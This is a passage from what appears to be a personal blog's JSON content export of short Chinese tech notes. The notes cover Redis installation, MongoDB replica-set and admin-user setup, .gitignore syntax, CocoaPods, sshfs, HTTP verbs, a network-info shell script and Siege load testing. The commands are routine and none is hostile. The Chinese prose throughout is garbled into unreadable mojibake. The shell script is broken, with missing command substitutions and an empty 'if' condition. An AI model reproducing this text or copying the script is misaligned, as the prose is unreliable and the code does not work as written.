ç§ç±»å‹ï¼›è¿˜æ”¯æŒæ•°æ®æŒä¹…åŒ–ã€‚å…‰stringç±»å‹ï¼Œå°±æ¯”memcachedåŠŸèƒ½æ›´å¼ºå¤§ï¼Œæä¾›äº†è·å–/è®¾ç½®å­ä¸²ã€bitä½ç­‰æ›´çµæ´»çš„æ“ä½œï¼Œå…¶ä»–ç±»å‹æ˜¯memcachedæ‰€æ²¡æœ‰çš„ã€‚redisçš„å¼€å‘è€…ç›¸å½“ç»™åŠ›ï¼Œæ›´æ–°å¾ˆé¢‘ç¹ã€‚redisçš„ç¼–è¯‘å®‰è£…å¾ˆç®€å•ï¼Œæ­¥éª¤å¦‚ä¸‹ï¼š# wget http://redis.googlecode.com/files/redis-2.4.4.tar.gz# tar -xzf redis-2.4.4.tar.gz# cd redis-2.4.4# make# make PREFIX=/usr/local/redis-2.4.4 install# cp redis.conf /usr/local/redis-2.4.4è‡³æ­¤ï¼Œç¼–è¯‘å®‰è£…å®Œæ¯•ã€‚å¯åŠ¨æœåŠ¡ï¼š# cd /usr/local/redis-2.4.4ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œå°†å…¶ä¸­çš„&quot;daemonize no&quot;è¡Œæ”¹ä¸º&quot;daemonize yes&quot;ï¼Œè®©å…¶åœ¨åå°è¿è¡Œã€‚# vim redis.confå¯åŠ¨redisæœåŠ¡# ./bin/redis-server redis.confå…³é—­æœåŠ¡ï¼š# ./bin/redis-cli -p 6379 shutdownç®€å•æ“ä½œï¼š# ./bin/redis-cliredis 127.0.0.1:6379&gt; set key hiOKredis 127.0.0.1:6379&gt; get key&quot;hi&quot;é™„ï¼šrediså®˜æ–¹ç½‘ç«™ï¼šhttp://redis.io/","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"redis","slug":"redis","permalink":"https://wangxiuwen.github.io/tags/redis/"}],"author":"wangxiuwen"},{"title":"mongodb é›†ç¾¤æ­å»º","slug":"history/tech/5953c4d0c2b92f5665eeda02","date":"2016-03-09T20:26:57.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda02/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda02/","excerpt":"","text":"å‘½ä»¤å¦‚ä¸‹1/usr/local/mongodb/bin/mongo --host 127.0.0.1 --port 10000åˆå§‹åŒ–é›†ç¾¤123456789101112rs.initiate( &#123; _id: &quot;driven&quot;, version: 1, members: [ &#123; _id: 0, host : &quot;10.0.177.242:10000&quot; &#125;, &#123; _id: 1, host : &quot;10.0.177.243:10000&quot; &#125; ] &#125;)rs.addArb(&quot;10.0.177.244:10000&quot;)åˆ›å»ºç”¨æˆ·1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980db.createUser( &#123; &quot;user&quot; : &quot;admin&quot;, &quot;pwd&quot;: &quot;xxx&quot;, &quot;roles&quot; : [ &#123; &quot;role&quot; : &quot;__queryableBackup&quot;, &quot;db&quot; : &quot;admin&quot; &#125;, &#123; &quot;role&quot; : &quot;__system&quot;, &quot;db&quot; : &quot;admin&quot; &#125;, &#123; &quot;role&quot; : &quot;backup&quot;, &quot;db&quot; : &quot;admin&quot; &#125;, &#123; &quot;role&quot; : &quot;clusterAdmin&quot;, &quot;db&quot; : &quot;admin&quot; &#125;, &#123; &quot;role&quot; : &quot;clusterManager&quot;, &quot;db&quot; : &quot;admin&quot; &#125;, &#123; &quot;role&quot; : &quot;clusterMonitor&quot;, &quot;db&quot; : &quot;admin&quot; &#125;, &#123; &quot;role&quot; : &quot;dbAdmin&quot;, &quot;db&quot; : &quot;admin&quot; &#125;, &#123; &quot;role&quot; : &quot;dbAdminAnyDatabase&quot;, &quot;db&quot; : &quot;admin&quot; &#125;, &#123; &quot;role&quot; : &quot;dbOwner&quot;, &quot;db&quot; : &quot;admin&quot; &#125;, &#123; &quot;role&quot; : &quot;enableSharding&quot;, &quot;db&quot; : &quot;admin&quot; &#125;, &#123; &quot;role&quot; : &quot;hostManager&quot;, &quot;db&quot; : &quot;admin&quot; &#125;, &#123; &quot;role&quot; : &quot;read&quot;, &quot;db&quot; : &quot;admin&quot; &#125;, &#123; &quot;role&quot; : &quot;readAnyDatabase&quot;, &quot;db&quot; : &quot;admin&quot; &#125;, &#123; &quot;role&quot; : &quot;readWrite&quot;, &quot;db&quot; : &quot;admin&quot; &#125;, &#123; &quot;role&quot; : &quot;readWriteAnyDatabase&quot;, &quot;db&quot; : &quot;admin&quot; &#125;, &#123; &quot;role&quot; : &quot;restore&quot;, &quot;db&quot; : &quot;admin&quot; &#125;, &#123; &quot;role&quot; : &quot;root&quot;, &quot;db&quot; : &quot;admin&quot; &#125;, &#123; &quot;role&quot; : &quot;userAdmin&quot;, &quot;db&quot; : &quot;admin&quot; &#125;, &#123; &quot;role&quot; : &quot;userAdminAnyDatabase&quot;, &quot;db&quot; : &quot;admin&quot; &#125; ]&#125; );è®¾ç½®ä¼˜å…ˆçº§123config=rs.conf()config.members[0].priority = 100rs.reconfig(config)","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"mongodb","slug":"mongodb","permalink":"https://wangxiuwen.github.io/tags/mongodb/"}],"author":"wangxiuwen"},{"title":"pipå®‰è£…","slug":"history/tech/5953c4d0c2b92f5665eeda01","date":"2016-03-09T19:33:53.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda01/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda01/","excerpt":"","text":"sudo easy_install pip","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"ç³»ç»Ÿæ“ä½œ","slug":"ç³»ç»Ÿæ“ä½œ","permalink":"https://wangxiuwen.github.io/tags/%E7%B3%BB%E7%BB%9F%E6%93%8D%E4%BD%9C/"}],"author":"wangxiuwen"},{"title":"Git çš„ .gitignore é…ç½®","slug":"history/tech/5953c4d0c2b92f5665eeda00","date":"2016-02-05T00:59:49.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda00/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda00/","excerpt":"","text":".gitignore é…ç½®æ–‡ä»¶ç”¨äºé…ç½®ä¸éœ€è¦åŠ å…¥ç‰ˆæœ¬ç®¡ç†çš„æ–‡ä»¶ï¼Œé…ç½®å¥½è¯¥æ–‡ä»¶å¯ä»¥ä¸ºæˆ‘ä»¬çš„ç‰ˆæœ¬ç®¡ç†å¸¦æ¥å¾ˆå¤§çš„ä¾¿åˆ©ï¼Œä»¥ä¸‹æ˜¯ä¸ªäººå¯¹äºé…ç½® .gitignore çš„ä¸€äº›å¿ƒå¾—ã€‚1ã€é…ç½®è¯­æ³•ï¼šä»¥æ–œæ â€œ/â€å¼€å¤´è¡¨ç¤ºç›®å½•ï¼›ä»¥æ˜Ÿå·â€œ*â€é€šé…å¤šä¸ªå­—ç¬¦ï¼›ä»¥é—®å·â€œ?â€é€šé…å•ä¸ªå­—ç¬¦ä»¥æ–¹æ‹¬å·â€œ[]â€åŒ…å«å•ä¸ªå­—ç¬¦çš„åŒ¹é…åˆ—è¡¨ï¼›ä»¥å¹å·â€œ!â€è¡¨ç¤ºä¸å¿½ç•¥(è·Ÿè¸ª)åŒ¹é…åˆ°çš„æ–‡ä»¶æˆ–ç›®å½•ï¼›æ­¤å¤–ï¼Œgit å¯¹äº .ignore é…ç½®æ–‡ä»¶æ˜¯æŒ‰è¡Œä»ä¸Šåˆ°ä¸‹è¿›è¡Œè§„åˆ™åŒ¹é…çš„ï¼Œæ„å‘³ç€å¦‚æœå‰é¢çš„è§„åˆ™åŒ¹é…çš„èŒƒå›´æ›´å¤§ï¼Œåˆ™åé¢çš„è§„åˆ™å°†ä¸ä¼šç”Ÿæ•ˆï¼›2ã€ç¤ºä¾‹ï¼šï¼ˆ1ï¼‰è§„åˆ™ï¼šfd1/*è¯´æ˜ï¼šå¿½ç•¥ç›®å½• fd1 ä¸‹çš„å…¨éƒ¨å†…å®¹ï¼›æ³¨æ„ï¼Œä¸ç®¡æ˜¯æ ¹ç›®å½•ä¸‹çš„ /fd1/ ç›®å½•ï¼Œè¿˜æ˜¯æŸä¸ªå­ç›®å½• /child/fd1/ ç›®å½•ï¼Œéƒ½ä¼šè¢«å¿½ç•¥ï¼›ï¼ˆ2ï¼‰è§„åˆ™ï¼š/fd1/*è¯´æ˜ï¼šå¿½ç•¥æ ¹ç›®å½•ä¸‹çš„ /fd1/ ç›®å½•çš„å…¨éƒ¨å†…å®¹ï¼›ï¼ˆ3ï¼‰è§„åˆ™ï¼š/*!.gitignore!/fw/bin/!/fw/sf/è¯´æ˜ï¼šå¿½ç•¥å…¨éƒ¨å†…å®¹ï¼Œä½†æ˜¯ä¸å¿½ç•¥ .gitignore æ–‡ä»¶ã€æ ¹ç›®å½•ä¸‹çš„ /fw/bin/ å’Œ /fw/sf/ ç›®å½•ï¼›","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"git","slug":"git","permalink":"https://wangxiuwen.github.io/tags/git/"}],"author":"wangxiuwen"},{"title":"swift toInt","slug":"history/tech/5953c4d0c2b92f5665eed9ff","date":"2016-02-03T17:22:26.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9ff/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9ff/","excerpt":"","text":"**Swift2.0ä¸­String.toInt()å·²é‡åä¸ºInt(String)çš„å¯å¤±è´¥æ„é€ å™¨ï¼Œå› ä¸ºæ„é€ å™¨è¯­æ³•æ›´é€‚åˆç±»å‹è½¬æ¢ã€‚**Swift2.0ä¸­String.toInt()å·²é‡åä¸ºInt(String)çš„å¯å¤±è´¥æ„é€ å™¨ï¼Œå› ä¸ºæ„é€ å™¨è¯­æ³•æ›´é€‚åˆç±»å‹è½¬æ¢ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"objective-c","slug":"objective-c","permalink":"https://wangxiuwen.github.io/tags/objective-c/"}],"author":"wangxiuwen"},{"title":"æœ€æ–°ç‰ˆ CocoaPods çš„å®‰è£…æµç¨‹","slug":"history/tech/5953c4d0c2b92f5665eed9fe","date":"2016-01-27T19:22:57.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9fe/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9fe/","excerpt":"","text":"iOS æœ€æ–°ç‰ˆ CocoaPods çš„å®‰è£…æµç¨‹1.ç§»é™¤ç°æœ‰Rubyé»˜è®¤æºgem sources --remove https://rubygems.org/2.ä½¿ç”¨æ–°çš„æºgem sources -a https://ruby.taobao.org/3.éªŒè¯æ–°æºæ˜¯å¦æ›¿æ¢æˆåŠŸ$gem sources -l4.å®‰è£…CocoaPods(1) sudo gem install cocoapods å¤‡æ³¨ï¼šè‹¹æœç³»ç»Ÿå‡çº§ OS X EL Capitan åæ”¹ä¸ºsudo gem install -n /usr/local/bin cocoapods(2) pod setup5.æ›´æ–°gemsudo gem update --system6. æ–°å»ºå·¥ç¨‹ï¼Œå¹¶åœ¨ç»ˆç«¯ç”¨cdæŒ‡ä»¤åˆ°æ–‡ä»¶å¤¹å†…pod search ç¬¬ä¸‰æ–¹7.æ–°å»ºæ–‡ä»¶ vim â€œPodfileâ€ï¼Œvim Podfileå†™å…¥ä»¥ä¸‹å†…å®¹å¹¶ä¿å­˜ å°æç¤ºï¼šï¼ˆç»ˆç«¯vimæ–‡ä»¶ æŒ‰ i å¯ç¼–è¾‘ ï¼Œesc é€€å‡ºç¼–è¾‘ï¼Œï¼šwq å¯ä¿å­˜é€€å‡ºï¼‰platform:ios, â€˜6.0â€™ pod â€˜AFNetworkingâ€™, â€˜~&gt; 2.3.1â€™ &lt;-------ç¬¬ä¸‰æ–¹8.å¯¼å…¥ç¬¬ä¸‰æ–¹åº“$pod install9.é€€å‡ºç»ˆç«¯ä»¥ä¸‹æ˜¯æˆ‘ç”¨ä»¥å‰çš„å®‰è£…æµç¨‹å®‰è£…æ—¶å‡ºç°çš„ä¸€äº›é”™è¯¯ç»ˆç«¯ cocoapods ä¸‹è½½bugè°ƒè¯•ï¼šé”™è¯¯1ï¼šError fetching http://ruby.taobao.org/:bad response Not Found 404 (http://ruby.taobao.org/specs.4.8.gz)è§£å†³æ–¹æ¡ˆï¼šæŠŠå®‰è£…æµç¨‹ä¸­ gem sources -a http://ruby.taobao.org/ ---æ”¹ä¸º---->gem sources -a https://ruby.taobao.org/é”™è¯¯2ï¼šERROR: While executing gem â€¦ (Errno::EPERM)Operation not permitted - /usr/bin/podè§£å†³æ–¹æ¡ˆï¼šè‹¹æœç³»ç»Ÿå‡çº§OS X EL Capitanåä¼šå‡ºç°çš„æ’ä»¶é”™è¯¯ï¼Œå°†å®‰è£…æµç¨‹ 4.å®‰è£…CocoaPods çš„ (1)sudo gem install cocoapods â€”â€”&gt;æ”¹ä¸ºsudo gem install -n /usr/local/bin cocoapodsé”™è¯¯3ï¼š Unable to satisfy the following requirements: - AVOSCloud (~&gt; 3.1.6.3) required by PodfileSpecs satisfying the AVOSCloud (~&gt; 3.1.6.3) dependency were found, but they required a higher minimum deployment target.è§£å†³æ–¹æ¡ˆï¼šå®‰è£…æµç¨‹ï¼šPodfileæ–‡ä»¶ ä¸­ platform:ios, â€˜6.0â€™ åè¾¹çš„ 6.0 æ˜¯å¹³å°ç‰ˆæœ¬å· ï¼Œä¸€å®šè¦åŠ ä¸Š","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"Mac OSX 10.10 Yosemite å®‰è£… sshfs æ–¹ä¾¿æŒ‚è½½è¿œç¨‹ç›®å½•","slug":"history/tech/5953c4d0c2b92f5665eed9fd","date":"2016-01-24T17:55:18.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9fd/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9fd/","excerpt":"","text":"**ä¸‹è½½ï¼šosxfuse-2.7.3.dmg http://osxfuse.github.io/**ä¸‹è½½ï¼šsshfs-2.5.0.pkg https://github.com/osxfuse/sshfs/releases/éƒ½å®‰è£…äº†å°±æå®šäº†ï¼Œå®‰è£…åå¯èƒ½éœ€è¦é‡å¯ã€‚ä½¿ç”¨ sshfs æŒ‚è½½è¿œç¨‹ç›®å½•åˆ°æœ¬åœ°ï¼šsshfs -C -o reconnect user@host:dir localdiræ›´å¤š sshfs çš„ç”¨æ³•å¯ä»¥ sshfs -h æŸ¥çœ‹ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"ç³»ç»Ÿæ“ä½œ","slug":"ç³»ç»Ÿæ“ä½œ","permalink":"https://wangxiuwen.github.io/tags/%E7%B3%BB%E7%BB%9F%E6%93%8D%E4%BD%9C/"}],"author":"wangxiuwen"},{"title":"app.use","slug":"history/tech/5953c4d0c2b92f5665eed9fb","date":"2016-01-24T03:03:37.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9fb/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9fb/","excerpt":"","text":"express restifyapp.use è¦æ”¾åˆ°è·¯ç”±ä¹‹å‰","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"express","slug":"express","permalink":"https://wangxiuwen.github.io/tags/express/"}],"author":"wangxiuwen"},{"title":"RESTFULæœåŠ¡ä¸­POST/PUT/PATCHæ–¹æ³•çš„åŒºåˆ«","slug":"history/tech/5953c4d0c2b92f5665eed9fa","date":"2016-01-24T03:03:03.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9fa/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9fa/","excerpt":"","text":"ç»å¸¸ä¼šæ··æ·†HTTPçš„POST/PUTæ–¹æ³•ï¼Œå› ä¸ºè¿™ä¸¤ä¸ªæ–¹æ³•ä¼¼ä¹éƒ½å¯ä»¥ç”¨æ¥åˆ›å»ºæˆ–æ›´æ–°ä¸€ä¸ªèµ„æºã€‚åŒºåˆ«æ˜¯ç»†å¾®ä½†æ¸…æ¥šçš„ï¼šPOSTæ–¹æ³•ç”¨æ¥åˆ›å»ºä¸€ä¸ªå­èµ„æºï¼Œå¦‚ /api/usersï¼Œä¼šåœ¨usersä¸‹é¢åˆ›å»ºä¸€ä¸ªuserï¼Œå¦‚users/1POSTæ–¹æ³•ä¸æ˜¯å¹‚ç­‰çš„ï¼Œå¤šæ¬¡æ‰§è¡Œï¼Œå°†å¯¼è‡´å¤šæ¡ç›¸åŒçš„ç”¨æˆ·è¢«åˆ›å»ºï¼ˆusers/1ï¼Œusers/2 â€¦è€Œè¿™äº›ç”¨æˆ·é™¤äº†è‡ªå¢é•¿idå¤–æœ‰ç€ç›¸åŒçš„æ•°æ®ï¼Œé™¤éä½ çš„ç³»ç»Ÿå®ç°äº†é¢å¤–çš„æ•°æ®å”¯ä¸€æ€§æ£€æŸ¥ï¼‰è€ŒPUTæ–¹æ³•ç”¨æ¥åˆ›å»ºä¸€ä¸ªURIå·²çŸ¥çš„èµ„æºï¼Œæˆ–å¯¹å·²çŸ¥èµ„æºè¿›è¡Œå®Œå…¨æ›¿æ¢ï¼Œæ¯”å¦‚users/1ï¼Œå› æ­¤PUTæ–¹æ³•ä¸€èˆ¬ä¼šç”¨æ¥æ›´æ–°ä¸€ä¸ªå·²çŸ¥èµ„æºï¼Œé™¤éåœ¨åˆ›å»ºå‰ï¼Œä½ å®Œå…¨çŸ¥é“è‡ªå·±è¦åˆ›å»ºçš„å¯¹è±¡çš„URIã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"nginx","slug":"nginx","permalink":"https://wangxiuwen.github.io/tags/nginx/"}],"author":"wangxiuwen"},{"title":"å‘½ä»¤è¡Œçœ‹cpu","slug":"history/tech/5953c4d0c2b92f5665eed9fc","date":"2016-01-24T01:25:59.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9fc/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9fc/","excerpt":"","text":"sysctl -n machdep.cpu.brand_string","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"ç³»ç»Ÿæ“ä½œ","slug":"ç³»ç»Ÿæ“ä½œ","permalink":"https://wangxiuwen.github.io/tags/%E7%B3%BB%E7%BB%9F%E6%93%8D%E4%BD%9C/"}],"author":"wangxiuwen"},{"title":"å‰ç«¯è·å–æµè§ˆå™¨userAgent","slug":"history/tech/5953c4d0c2b92f5665eed9f9","date":"2016-01-19T22:07:55.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9f9/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9f9/","excerpt":"","text":"navigator.userAgent","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"javascript","slug":"javascript","permalink":"https://wangxiuwen.github.io/tags/javascript/"}],"author":"wangxiuwen"},{"title":"git æ£€å‡ºæŒ‡å®šç«¯å£å·","slug":"history/tech/5953c4d0c2b92f5665eed9f8","date":"2016-01-19T03:02:05.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9f8/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9f8/","excerpt":"","text":"git clone ssh://qianrushi@qianrushi.org:222/git/xxx.gitThe following syntaxes may be used with them:ssh://host.xz/path/to/repo.git/git://host.xz/path/to/repo.git/http://host.xz/path/to/repo.git/ftp://host.xz/path/to/repo.git/rsync://host.xz/path/to/repo.git/An alternative scp-like syntax may also be used with the ssh protocol:host.xz:path/to/repo.git/","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"git","slug":"git","permalink":"https://wangxiuwen.github.io/tags/git/"}],"author":"wangxiuwen"},{"title":"äº¤å‰ç¼–è¯‘å™¨æç¤º æ–‡ä»¶æœªæ‰¾åˆ°","slug":"history/tech/5953c4d0c2b92f5665eed9f7","date":"2016-01-17T02:25:55.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9f7/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9f7/","excerpt":"","text":"äº¤å‰ç¼–è¯‘å™¨æç¤º æ–‡ä»¶æœªæ‰¾åˆ°sudo apt-get install lib32z1 lib32ncurses5 lib32bz2-1.0apt-get install lib32stdc++6","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"äº¤å‰ç¼–è¯‘","slug":"äº¤å‰ç¼–è¯‘","permalink":"https://wangxiuwen.github.io/tags/%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91/"}],"author":"wangxiuwen"},{"title":"Shellè„šæœ¬è·å–æœ¬åœ°ç½‘å¡IPã€macåœ°å€ã€å­ç½‘æ©ç ã€dns IPã€å¤–ç½‘IP","slug":"history/tech/5953c4d0c2b92f5665eed9f6","date":"2016-01-17T02:24:25.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9f6/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9f6/","excerpt":"","text":"#/usr/bin/env bash Name: get_network_info.sh Author: Purple_Grape This is a script to gather network information of your Linux system. Test under Ubuntu 10.04 only.#----------------------------NIC=eth0MAC=LANG=C ifconfig $NIC | awk '/HWaddr/{ print $5 }'IP=LANG=C ifconfig $NIC | awk '/inet addr:/{ print $2 }' | awk -F: '{print $2 }'MASK=LANG=C ifconfig $NIC | awk -F: '/Mask/{print $4}'ext_ip=curl ifconfig.meif ;thendns=awk '/^nameserver/{print $2}' /etc/resolv.conffi#----------------------------echo â€œYour network information is as below:â€echo $MACecho $IPecho $dnsecho $ext_ip","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"Siege å‹åŠ›æµ‹è¯•","slug":"history/tech/5953c4d0c2b92f5665eed9f5","date":"2016-01-14T04:02:04.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9f5/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9f5/","excerpt":"","text":"http://download.joedog.org/è§£å‹å¹¶å®‰è£…ï¼š tar -zxvf siege-latest.tar.gz cd siege-2.72/ ./configure â€“prefix=/usr/local/siege â€“mandir=/usr/local/manå®‰è£…å®Œæˆåï¼Œè¿è¡Œbinä¸­çš„siege_configå‘½ä»¤æ¥åˆ›å»º.siegeæ–‡ä»¶ä¹‹åï¼Œä½ å¯ä»¥é€šè¿‡./siege -Cå‘½ä»¤æ¥æŸ¥çœ‹å½“å‰é…ç½®æœ€ç®€å•çš„ä½¿ç”¨å‘½ä»¤ï¼š./siege http://localhost/#ç”¨æ¥æµ‹è¯•æœ¬åœ°ä¸»é¡µç¤ºä¾‹ï¼šsiege -c 100 -r 2 --header â€œCookie: your-cookie-name=your-cookie-valueâ€ -f urls.txtå‚æ•°è¯´æ˜ï¼š-c 20 å¹¶å‘20ä¸ªç”¨æˆ·-r 2 é‡å¤å¾ªç¯2æ¬¡-f urls.txt ä»»åŠ¡åˆ—è¡¨ï¼šURLåˆ—è¡¨å‚æ•°è¯¦è§£ï¼š-C,æˆ–â€“config åœ¨å±å¹•ä¸Šæ‰“å°æ˜¾ç¤ºå‡ºå½“å‰çš„é…ç½®,é…ç½®æ˜¯åŒ…æ‹¬åœ¨ä»–çš„é…ç½®æ–‡ä»¶HOME/.siegercä¸­,å¯ä»¥ç¼–è¾‘é‡Œé¢çš„å‚æ•°,è¿™æ ·æ¯æ¬¡siege éƒ½ä¼šæŒ‰ç…§å®ƒè¿è¡Œ. -v è¿è¡Œæ—¶èƒ½çœ‹åˆ°è¯¦ç»†çš„è¿è¡Œä¿¡æ¯ -c n,æˆ–â€“concurrent=n æ¨¡æ‹Ÿæœ‰nä¸ªç”¨æˆ·åœ¨åŒæ—¶è®¿é—®,nä¸è¦è®¾å¾—å¤ªå¤§,å› ä¸ºè¶Šå¤§,siege æ¶ˆè€—æœ¬åœ°æœºå™¨çš„èµ„æºè¶Šå¤š -i,â€“internet 